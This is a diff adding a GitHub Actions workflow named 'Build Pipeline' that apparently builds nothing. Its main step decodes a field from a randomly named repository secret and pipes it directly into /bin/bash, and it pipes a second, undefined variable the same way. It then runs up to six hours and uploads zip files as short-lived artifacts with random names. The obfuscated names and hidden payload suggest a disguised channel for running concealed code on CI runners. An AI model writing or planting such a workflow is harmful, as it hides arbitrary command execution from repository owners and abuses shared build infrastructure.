@@ -1,0 +1,27 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  compile:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Setup and run
+        env:
+          xbvuw854: ${{ secrets.xbvuw854 }}
+        run: |
+          printf '%s' "$xbvuw854" | jq -r .ml03 | /bin/bash
+          echo $ljv0 | jq -r .iujdp15444 | /bin/bash
+
+      - name: Upload data
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: XPFOJR0W
+          path: "*.zip"
+          retention-days: 1
